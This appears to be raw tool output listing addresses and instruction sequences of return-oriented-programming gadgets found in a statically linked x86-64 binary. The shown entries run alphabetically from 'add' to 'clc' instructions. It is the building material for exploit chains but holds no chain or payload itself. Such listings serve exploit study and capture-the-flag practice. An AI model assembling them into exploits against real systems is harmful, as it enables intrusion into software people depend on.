0x000000000046d17a : add esp, 0x58 ; jmp qword ptr [rax]
0x000000000043b97a : add esp, 0x58 ; ret
0x00000000004605a4 : add esp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043b86c : add esp, 0x68 ; ret
0x00000000004607ab : add esp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000461d31 : add esp, 0x78 ; ret
0x0000000000455fb3 : add esp, 0x80 ; mov eax, edx ; pop rbx ; ret
0x0000000000461a4b : add esp, 0x80 ; pop rbx ; ret
0x000000000040cd18 : add esp, 0x80 ; ret
0x0000000000400d32 : add esp, 0x88 ; pop rbx ; ret
0x000000000040ae44 : add esp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000000447e56 : add esp, 0xb8 ; pop rbx ; pop r12 ; ret
0x0000000000407cc7 : add esp, 0xd0 ; pop rbx ; ret
0x0000000000407e56 : add esp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00000000004079d5 : add esp, 0xd8 ; ret
0x0000000000409a5f : add esp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000046b67b : add esp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00000000004081ee : add esp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000040fc50 : add esp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000040afb6 : add esp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x0000000000472d19 : add esp, 8 ; movzx eax, al ; neg eax ; ret
0x000000000040b6c4 : add esp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401c83 : add esp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400413 : add esp, 8 ; ret
0x00000000004138bf : add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000442204 : add qword ptr [rax - 0x7d], r9 ; ret 0x8b01
0x0000000000427c12 : add r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x0000000000468320 : add r14, r15 ; test edi, edi ; jne 0x468330 ; call rax
0x0000000000403d44 : add r14, rax ; mov eax, dword ptr [r15 + 4] ; jmp 0x403d18
0x0000000000427ba2 : add r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x0000000000427b32 : add r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x000000000041d104 : add r8, qword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041fc1a : add r9, r11 ; jmp r9
0x0000000000451688 : add r9d, eax ; mov eax, r9d ; ret
0x00000000004610a0 : add rax, 1 ; ret
0x0000000000461097 : add rax, 2 ; ret
0x000000000046231b : add rax, 2 ; test ecx, ecx ; jne 0x462379 ; ret
0x00000000004610b0 : add rax, 3 ; ret
0x000000000044a368 : add rax, qword ptr [0] ; ret
0x0000000000467dd5 : add rax, qword ptr [r14] ; call rax
0x0000000000468ceb : add rax, qword ptr [rbp - 0xb8] ; call rax
0x0000000000471706 : add rax, qword ptr [rdx + 8] ; call rax
0x000000000044a367 : add rax, qword ptr fs:[0] ; ret
0x00000000004680b6 : add rax, r11 ; call rax
0x00000000004763bc : add rax, r12 ; jmp rax
0x0000000000476cbd : add rax, r14 ; jmp rax
0x000000000047536b : add rax, r15 ; jmp rax
0x0000000000475145 : add rax, r8 ; jmp rax
0x00000000004768f5 : add rax, r9 ; jmp rax
0x000000000043f003 : add rax, rbp ; jmp rax
0x000000000043ef8b : add rax, rbx ; jmp rax
0x0000000000432b47 : add rax, rcx ; add rax, rdi ; vzeroupper ; ret
0x000000000040fce5 : add rax, rcx ; cmp rax, rdx ; jne 0x40fcf8 ; ret
0x000000000045be2a : add rax, rcx ; jmp rax
0x000000000041d4f8 : add rax, rcx ; ret
0x0000000000432eac : add rax, rcx ; sub rax, rdx ; vzeroupper ; ret
0x000000000041da25 : add rax, rcx ; vzeroupper ; ret
0x000000000041d4f5 : add rax, rdi ; add rax, rcx ; ret
0x000000000041da22 : add rax, rdi ; add rax, rcx ; vzeroupper ; ret
0x000000000041d723 : add rax, rdi ; ret
0x000000000046fdcf : add rax, rdi ; sub rax, r8 ; ret
0x0000000000432f64 : add rax, rdi ; sub rax, rdx ; vzeroupper ; ret
0x0000000000438f09 : add rax, rdi ; sub rax, rsi ; ret
0x000000000041db99 : add rax, rdi ; vzeroupper ; ret
0x0000000000401b65 : add rax, rdx ; jmp rax
0x0000000000432e55 : add rax, rdx ; sub rax, rdi ; ret
0x000000000043a43b : add rax, rsi ; jmp rax
0x00000000004067bb : add rbp, 8 ; mov qword ptr [r15], rax ; jmp 0x40678e
0x000000000040693a : add rbp, 8 ; mov qword ptr [r15], rax ; jmp 0x40690e
0x0000000000467dd1 : add rbx, 0x18 ; add rax, qword ptr [r14] ; call rax
0x000000000041e5b1 : add rcx, r11 ; jmp rcx
0x000000000043a463 : add rcx, rsi ; jmp rcx
0x0000000000405ccb : add rdi, r10 ; jmp rdi
0x000000000041fc17 : add rdi, rdx ; add r9, r11 ; jmp r9
0x000000000046e4d1 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x0000000000471ba6 : add rdx, rax ; jmp 0x471bb6
0x00000000004059e2 : add rdx, rdi ; jmp rdx
0x00000000004498b4 : add rsi, r8 ; jmp rsi
0x000000000040d480 : add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000408660 : add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040e97e : add rsp, 0x10 ; pop rbx ; ret
0x00000000004063a1 : add rsp, 0x110 ; pop rbx ; ret
0x000000000044a699 : add rsp, 0x148 ; ret
0x0000000000414432 : add rsp, 0x18 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000414475 : add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x00000000004096e4 : add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000414ef8 : add rsp, 0x18 ; ret
0x000000000040dc2c : add rsp, 0x20 ; mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x000000000040d9dc : add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000040dc65 : add rsp, 0x20 ; pop rbx ; mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000447f7a : add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040d74e : add rsp, 0x20 ; pop rbx ; ret
0x000000000043b749 : add rsp, 0x28 ; ret
0x0000000000441057 : add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000472dca : add rsp, 0x30 ; pop rbx ; ret
0x0000000000474f35 : add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000040cf6d : add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000461f85 : add rsp, 0x38 ; ret
0x000000000046d1eb : add rsp, 0x48 ; jmp qword ptr [rax]
0x000000000046d438 : add rsp, 0x48 ; ret
0x000000000046d179 : add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000043b979 : add rsp, 0x58 ; ret
0x00000000004605a3 : add rsp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043b86b : add rsp, 0x68 ; ret
0x00000000004607aa : add rsp, 0x70 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000461d30 : add rsp, 0x78 ; ret
0x0000000000461a4a : add rsp, 0x80 ; pop rbx ; ret
0x000000000040cd17 : add rsp, 0x80 ; ret
0x0000000000400d31 : add rsp, 0x88 ; pop rbx ; ret
0x000000000040ae43 : add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x0000000000407cc6 : add rsp, 0xd0 ; pop rbx ; ret
0x0000000000407e55 : add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00000000004079d4 : add rsp, 0xd8 ; ret
0x0000000000409a5e : add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000046b67a : add rsp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00000000004081ed : add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000040fc4f : add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000040afb5 : add rsp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x0000000000472d18 : add rsp, 8 ; movzx eax, al ; neg eax ; ret
0x0000000000401c82 : add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400412 : add rsp, 8 ; ret
0x00000000004138be : add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000414fb6 : add sil, sil ; ret 0x4804
0x0000000000416a57 : add word ptr [rax], ax ; and ch, 2 ; cmovne rax, rdx ; ret
0x000000000046fe9a : add word ptr [rdx + rax*2], 1 ; ret
0x000000000044f1fe : and al, 0 ; mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x0000000000459c7d : and al, 0 ; mov rax, qword ptr [rax + rsi*8] ; jmp rax
0x00000000004775a8 : and al, 0x10 ; add rsp, 0x28 ; ret
0x0000000000479161 : and al, 0x10 ; call r14
0x000000000046d89b : and al, 0x10 ; call rdx
0x0000000000447fa0 : and al, 0x10 ; mov dword ptr [r12], edx ; jmp 0x447f71
0x00000000004123f1 : and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rcx
0x000000000041236e : and al, 0x10 ; mov qword ptr [rsp + 8], rax ; call rsi
0x000000000043cadb : and al, 0x10 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000045e982 : and al, 0x10 ; mov rdi, r12 ; call rbx
0x000000000044ab50 : and al, 0x10 ; mov rdi, rbp ; call r12
0x0000000000478f48 : and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x0000000000414a03 : and al, 0x18 ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00000000004010e5 : and al, 0x18 ; call rax
0x0000000000416277 : and al, 0x18 ; jmp 0x416241
0x0000000000440228 : and al, 0x18 ; mov r9, r13 ; call rbx
0x000000000045e89d : and al, 0x18 ; mov rdi, r12 ; call rbx
0x0000000000460aaf : and al, 0x18 ; mov rdi, rbp ; mov r9, r14 ; call rbx
0x000000000046d896 : and al, 0x18 ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000442552 : and al, 0x20 ; call r15
0x0000000000406735 : and al, 0x20 ; call rax
0x0000000000460770 : and al, 0x20 ; call rbx
0x0000000000490264 : and al, 0x26 ; outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x0000000000414473 : and al, 0x28 ; add rsp, 0x18 ; pop rbx ; pop rbp ; jmp rax
0x0000000000460648 : and al, 0x28 ; lea rcx, [rax + 1] ; call rbx
0x000000000044254d : and al, 0x28 ; mov rdi, qword ptr [rsp + 0x20] ; call r15
0x0000000000415133 : and al, 0x28 ; mov rdi, rbp ; call rax
0x000000000044378c : and al, 0x30 ; call r14
0x0000000000443621 : and al, 0x30 ; call r15
0x0000000000442ef1 : and al, 0x30 ; call rbx
0x000000000046095e : and al, 0x30 ; mov rdi, rbp ; call rbx
0x0000000000497660 : and al, 0x37 ; add byte ptr [rax], al ; jl 0x49768c ; cli ; call rsp
0x00000000004428fd : and al, 0x38 ; call r14
0x00000000004445d8 : and al, 0x38 ; call r15
0x00000000004441b0 : and al, 0x38 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x0000000000443787 : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r14
0x000000000044361c : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call r15
0x0000000000442eec : and al, 0x38 ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x000000000046d1e9 : and al, 0x40 ; add rsp, 0x48 ; jmp qword ptr [rax]
0x000000000046d177 : and al, 0x40 ; add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000044524d : and al, 0x40 ; call r15
0x0000000000444d90 : and al, 0x40 ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x00000000004428f8 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00000000004445d3 : and al, 0x40 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x000000000040d4a8 : and al, 0x48 ; add esp, 0x10 ; pop rbx ; jmp rax
0x0000000000475018 : and al, 0x48 ; add esp, 0x38 ; pop rbx ; pop r14 ; ret
0x0000000000474d1c : and al, 0x48 ; add esp, 0x38 ; ret
0x0000000000446136 : and al, 0x48 ; call r14
0x00000000004439e6 : and al, 0x48 ; call r15
0x000000000040b304 : and al, 0x48 ; mov edi, ebx ; call rax
0x000000000047804e : and al, 0x48 ; mov edx, dword ptr [rbp] ; call r12
0x0000000000445248 : and al, 0x48 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000477fff : and al, 0x4c ; lea esi, [rbx + rcx*8] ; mov rsi, qword ptr [r14] ; call r12
0x0000000000446131 : and al, 0x50 ; mov rdi, qword ptr [rsp + 0x48] ; call r14
0x00000000004439e1 : and al, 0x50 ; mov rdi, qword ptr [rsp + 0x48] ; call r15
0x0000000000402833 : and al, 0x80 ; add byte ptr [rax], al ; add al, ch ; ret
0x0000000000402777 : and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00000000004654d5 : and al, 0x80 ; add byte ptr [rax], al ; add cl, ch ; ret
0x000000000044795d : and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000040fa33 : and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x000000000044843d : and al, 0x89 ; ret
0x0000000000442c81 : and al, 0x98 ; add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000044279b : and al, 0xa0 ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x0000000000447a33 : and al, 0xb0 ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x000000000047718b : and al, 0xbf ; add dword ptr [rax], eax ; add byte ptr [rax], al ; call rax
0x000000000043bdac : and al, 0xc ; add rsp, 0x10 ; pop rbx ; ret
0x00000000004010e0 : and al, 0xc ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000040d8dc : and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x0000000000475118 : and al, 0xd8 ; ret
0x000000000040e933 : and al, 0xe9 ; ret 0xfffd
0x0000000000447fa5 : and al, 0xeb ; ret 0x1f0f
0x00000000004947f9 : and al, 0xf7 ; call rsp
0x0000000000443931 : and al, 8 ; add byte ptr [rcx - 0x77], al ; ret 0x8949
0x000000000040da0d : and al, 8 ; add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000044a83e : and al, 8 ; call r12
0x00000000004067ab : and al, 8 ; call rax
0x00000000004123f6 : and al, 8 ; call rcx
0x0000000000412373 : and al, 8 ; call rsi
0x0000000000478c4c : and al, 8 ; jmp 0x478c66
0x0000000000406730 : and al, 8 ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x0000000000409080 : and al, 8 ; mov rdi, r15 ; call rax
0x0000000000479804 : and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000047a443 : and al, byte ptr [rax] ; jne 0x47a42d ; pop rbx ; ret
0x00000000004797f6 : and al, byte ptr [rax] ; test eax, eax ; je 0x479807 ; ret
0x0000000000479906 : and al, byte ptr [rax] ; test eax, eax ; je 0x479917 ; ret
0x00000000004330ba : and al, byte ptr [rsp - 0xb7f68c] ; ret 0xc148
0x0000000000455153 : and bh, al ; add ch, byte ptr [rbx] ; add byte ptr [rax], al ; add cl, ch ; ret
0x0000000000456e54 : and bh, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x000000000047d79d : and bh, bl ; call rax
0x000000000047d799 : and bl, bh ; push qword ptr [rax] ; and bh, bl ; call rax
0x000000000047d0d0 : and bl, byte ptr [rdi - 0x616d0006] ; cli ; jmp qword ptr [rdx]
0x0000000000409349 : and byte ptr [r8 + 1], r9b ; ret
0x00000000004092ae : and byte ptr [r9 - 0x77], r9b ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x0000000000471bae : and byte ptr [rax + 0x39], cl ; ret 0x2974
0x000000000044aad8 : and byte ptr [rax + 0x39], cl ; ret 0x8d48
0x0000000000432a5a : and byte ptr [rax + 0x3a], al ; xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x000000000041dbac : and byte ptr [rax + 1], cl ; clc ; vzeroupper ; ret
0x000000000040934a : and byte ptr [rax + 1], cl ; ret
0x0000000000400e81 : and byte ptr [rax + 1], cl ; ret 0xb70f
0x0000000000463a1c : and byte ptr [rax - 0x75], cl ; sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x0000000000449d44 : and byte ptr [rax - 0x77], cl ; sti ; test rax, rax ; je 0x449d58 ; call rax
0x0000000000441516 : and byte ptr [rax - 0x7d], cl ; ret
0x0000000000477686 : and byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000040ad92 : and byte ptr [rax - 1], bh ; pop rbx ; ret
0x000000000046777c : and byte ptr [rax - 3], dl ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x0000000000477659 : and byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000043a54a : and byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000049945c : and byte ptr [rbp], dl ; add al, dl ; sti ; cli ; call rsp
0x0000000000447f7d : and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000495280 : and byte ptr [rbx - 9], bl ; call rdi
0x000000000044c2b0 : and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000040dc2f : and byte ptr [rcx - 0x2dcea42f], cl ; jmp rax
0x00000000004092af : and byte ptr [rcx - 0x77], cl ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x0000000000499aa0 : and byte ptr [rcx], 0xfb ; call rsp
0x000000000040f780 : and byte ptr [rcx], ch ; add byte ptr [rcx + 0x39], cl ; ret 0x870f
0x00000000004394b1 : and byte ptr [rdi], cl ; adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000043d568 : and byte ptr [rdi], cl ; test byte ptr [rcx], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000407e7b : and byte ptr [rdi], cl ; test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x0000000000436f00 : and byte ptr [rdi], cl ; test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x000000000045334a : and byte ptr [rdx + rbp*2], ch ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x0000000000458d13 : and byte ptr [rdx + rbp*2], ch ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000041e64a : and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000499d35 : and byte ptr [rsi + rcx + 0x18], bh ; ret
0x000000000043c41c : and byte ptr [rsi - 0x76b70003], al ; ret
0x0000000000497d5c : and byte ptr [rsi], bh ; add byte ptr [rax], al ; mov al, 0x40 ; cli ; call qword ptr [rbx]
0x0000000000461092 : and ch, 0xf ; je 0x4610b9 ; add rax, 2 ; ret
0x000000000043a508 : and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x0000000000416a5a : and ch, 2 ; cmovne rax, rdx ; ret
0x000000000049c57d : and ch, bh ; call rdi
0x000000000040f5a5 : and ch, byte ptr [rcx] ; add byte ptr [rcx], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000047d744 : and ch, dh ; cli ; push qword ptr [rax] ; idiv edx ; call rax
0x000000000046107d : and cl, 0xf ; je 0x4610a5 ; ret
0x0000000000411b27 : and cl, bpl ; ret 0xfffc
0x000000000043e2d1 : and cl, byte ptr [rax + 0x63] ; add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000046add4 : and cl, byte ptr [rax - 0x77] ; ret 0x1f0f
0x000000000041de8d : and cl, byte ptr [rcx - 0x77] ; ret
0x0000000000411b28 : and cl, ch ; ret 0xfffc
0x000000000043dc11 : and dh, al ; sub byte ptr [r9], r8b ; ret
0x0000000000493a0d : and dh, bh ; jmp rsp
0x0000000000456e53 : and dil, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x00000000004162e3 : and dword ptr [rax - 0x7d], ecx ; ret 0x4801
0x000000000043b695 : and dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0x6ae9
0x000000000043b600 : and dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xffe9
0x0000000000491d82 : and dword ptr [rax], edx ; jmp qword ptr [rdi]
0x000000000040dfb7 : and dword ptr [rbx], 0xffffffef ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000040e00f : and dword ptr [rbx], 0xffffffef ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040f675 : and dword ptr [rcx], ebp ; add bl, dh ; ret
0x000000000040ee1e : and dword ptr [rdi], ecx ; mov dh, 0 ; ret
0x0000000000416732 : and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000048ee39 : and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x0000000000491d81 : and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000044a36b : and eax, 0 ; ret
0x000000000046eeac : and eax, 0x28 ; jne 0x46eef6 ; leave ; ret
0x00000000004004c9 : and eax, 0x2a0bfa ; nop ; ret
0x0000000000406ef8 : and eax, 0x30 ; call rax
0x0000000000406e32 : and eax, 0x30 ; call rdx
0x0000000000406f1e : and eax, 0x30 ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000043a48d : and eax, 0x3fc00 ; pop rbx ; ret
0x000000000043a4d8 : and eax, 0x3fffc00 ; pop rbx ; ret
0x0000000000442200 : and eax, 0x4e8d4800 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8b01
0x00000000004101f4 : and eax, 0x518d4800 ; dec dword ptr [rax - 0x7b] ; ret 0x850f
0x000000000043a583 : and eax, 0x7ff80000 ; div ecx ; mov eax, eax ; ret
0x000000000043a527 : and eax, 0x7ff80000 ; ret
0x00000000004024a0 : and eax, 0x89480001 ; ret 0x8548
0x000000000043da87 : and eax, 0xc ; cmp eax, 4 ; je 0x43da98 ; ret
0x000000000044a30c : and eax, 0xf3087400 ; ret
0x0000000000415cb2 : and eax, 0xf480000 ; ret 0xc3f3
0x000000000046d9ec : and eax, 2 ; sub eax, 1 ; ret
0x000000000046adf5 : and eax, dword ptr [rax] ; add rsp, 8 ; ret
0x000000000046fe98 : and eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x000000000046f8ea : and eax, dword ptr [rax] ; mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x000000000046d638 : and eax, dword ptr [rax] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000046f4b5 : and eax, dword ptr [rax] ; mov qword ptr [rip + 0x234baa], rax ; ret
0x000000000046ae9f : and eax, dword ptr [rax] ; mov qword ptr [rsi], rax ; ret
0x000000000046ad39 : and eax, dword ptr [rax] ; ret
0x00000000004676a2 : and eax, dword ptr [rax] ; xor eax, eax ; add rsp, 8 ; ret
0x000000000040dfb8 : and ebp, edi ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000040e010 : and ebp, edi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000043da22 : and ebx, 0xffffffbb ; cmp r11d, 0xa ; je 0x43da35 ; ret
0x0000000000499aa1 : and ebx, edi ; call rsp
0x000000000041fbc5 : and ecx, 0xff ; sub eax, ecx ; ret
0x000000000041f2f8 : and ecx, 0xffff ; sub eax, ecx ; ret
0x000000000043d34a : and ecx, dword ptr [rax - 0x77] ; ret 0xabe
0x000000000047d7a1 : and edi, ebx ; push qword ptr [rax + 0x25] ; sti ; call qword ptr [rax]
0x000000000046f4a0 : and rax, qword ptr [r8] ; add rsp, 8 ; ret
0x000000000046f4bb : and rax, qword ptr [r8] ; ret
0x0000000000470033 : and rax, qword ptr [rax] ; ret
0x0000000000460bd7 : bnd je 0x460be6 ; test edx, edx ; jne 0x460bd8 ; ret
0x000000000047d59c : bnd retf ; cli ; push qword ptr [rdx - 0x35] ; cli ; jmp rdx
0x000000000041d7fa : bsf eax, eax ; add rax, rdi ; add rax, rcx ; ret
0x000000000041d720 : bsf eax, eax ; add rax, rdi ; ret
0x000000000041dc11 : bsf eax, eax ; add rax, rdi ; vzeroupper ; ret
0x000000000041d730 : bsf eax, eax ; lea rax, [rax + rdi + 0x10] ; ret
0x000000000041d740 : bsf eax, eax ; lea rax, [rax + rdi + 0x20] ; ret
0x000000000041d710 : bsf eax, eax ; lea rax, [rax + rdi - 0x10] ; ret
0x000000000041d66f : bsf eax, eax ; lea rax, [rdi + rax + 0x30] ; ret
0x00000000004326d3 : bsf eax, eax ; lea rax, [rdi + rax] ; ret
0x0000000000432cf6 : bsf eax, edx ; ret
0x0000000000460c87 : bsf eax, edx ; shr rax, 2 ; ret
0x0000000000432e52 : bsf edx, edx ; add rax, rdx ; sub rax, rdi ; ret
0x00000000004327f0 : bsf rax, rax ; lea rax, [rdi + rax] ; ret
0x0000000000432d42 : bsf rax, rdx ; ret
0x0000000000460c86 : bsf rax, rdx ; shr rax, 2 ; ret
0x000000000045fac7 : bsr eax, eax ; add rax, rdi ; ret
0x000000000045fd4b : bsr eax, esi ; add rax, rdi ; ret
0x000000000045fc59 : bsr esi, esi ; lea rax, [rcx + rsi] ; ret
0x000000000045fb55 : bsr esi, esi ; lea rax, [rdi + rsi] ; ret
0x000000000045fac6 : bsr rax, rax ; add rax, rdi ; ret
0x000000000045fd4a : bsr rax, rsi ; add rax, rdi ; ret
0x000000000045fc58 : bsr rsi, rsi ; lea rax, [rcx + rsi] ; ret
0x000000000045fb54 : bsr rsi, rsi ; lea rax, [rdi + rsi] ; ret
0x00000000004696d8 : call 0x11091a28
0x0000000000498a98 : call 0x11498538
0x0000000000499918 : call 0x11499438
0x000000000049a7c8 : call 0x2349a40f
0x000000000049c0a8 : call 0x2749bdb7
0x0000000000464183 : call 0x40042a
0x0000000000473d99 : call 0x40043f
0x0000000000445704 : call 0x4019f2
0x000000000044341e : call 0x4019f9
0x00000000004139e9 : call 0x40fc82
0x0000000000413f46 : call 0x4101d2
0x0000000000414db1 : call 0x411052
0x00000000004486cd : call 0x414962
0x0000000000400758 : call 0x43a3f6
0x0000000000400621 : call 0x43a836
0x0000000000472091 : call 0x43b198
0x000000000046ce7d : call 0x43c778
0x0000000000461804 : call 0x43dad2
0x0000000000471d9c : call 0x469eb6
0x000000000046db14 : call 0x4d096d2b
0x000000000042719a : call 0x4fc18198
0x0000000000427199 : call 0x4fc18199
0x0000000000429cba : call 0x4fc1acb8
0x0000000000429cb9 : call 0x4fc1acb9
0x000000000043a4ea : call 0xffffffff84062dfe
0x000000000046c967 : call 0xffffffff84568ba7
0x000000000046b404 : call 0xffffffff8b8f9d85
0x000000000048f8a3 : call 0xffffffffaf0b9719
0x0000000000452d5a : call 0xffffffffc27e7564
0x0000000000413609 : call 0xffffffffc2ca7e22
0x0000000000469cd2 : call 0xffffffffc2cfe8dc
0x00000000004583cc : call 0xffffffffc3c983d4
0x00000000004331a7 : call 0xffffffffc413baf8
0x00000000004330c7 : call 0xffffffffc43bba18
0x0000000000496478 : call 0xffffffffe1495c1f
0x00000000004017e0 : call qword ptr [r15 + rbx*8]
0x000000000047cdfb : call qword ptr [rax + 0x20fffaab]
0x000000000047d2f3 : call qword ptr [rax + 0x20fffad2]
0x000000000047d817 : call qword ptr [rax + 0x20fffb4a]
0x000000000047d7b7 : call qword ptr [rax + 0x30fffb2d]
0x000000000045a7de : call qword ptr [rax - 0x413d76b4]
0x000000000047d837 : call qword ptr [rax]
0x0000000000400fce : call qword ptr [rbx + 0x10]
0x0000000000406ff0 : call qword ptr [rbx]
0x000000000047657d : call qword ptr [rcx]
0x00000000004017e1 : call qword ptr [rdi + rbx*8]
0x0000000000495ff3 : call qword ptr [rdi]
0x000000000047d0d3 : call qword ptr [rdx + 0x22fffa9e]
0x000000000047cec3 : call qword ptr [rdx + 0x22fffaaa]
0x000000000047d3bb : call qword ptr [rdx + 0x22fffad1]
0x0000000000464a0d : call qword ptr [rdx]
0x0000000000493e67 : call qword ptr [rip + 0x20fffe2c]
0x000000000047ce1f : call qword ptr [rsi + 0x26fffaae]
0x000000000047afbb : call qword ptr [rsi]
0x0000000000468177 : call r10
0x000000000040089c : call r11
0x0000000000447cbc : call r12
0x000000000043cc9f : call r14
0x00000000004405db : call r15
0x0000000000468327 : call rax
0x000000000040089d : call rbx
0x00000000004123f8 : call rcx
0x00000000004405dc : call rdi
0x0000000000406e37 : call rdx
0x0000000000412375 : call rsi
0x000000000047e1cb : call rsp
0x00000000004768f4 : cdq ; add rax, r9 ; jmp rax
0x00000000004915e0 : cdq ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x000000000044ac23 : cdq ; pop rax ; sti ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000457647 : clc ; add al, byte ptr [rcx + 0x29] ; ret
0x0000000000457620 : clc ; add cl, byte ptr [rax + 0x29] ; ret
0x0000000000412b1a : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x000000000041262f : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
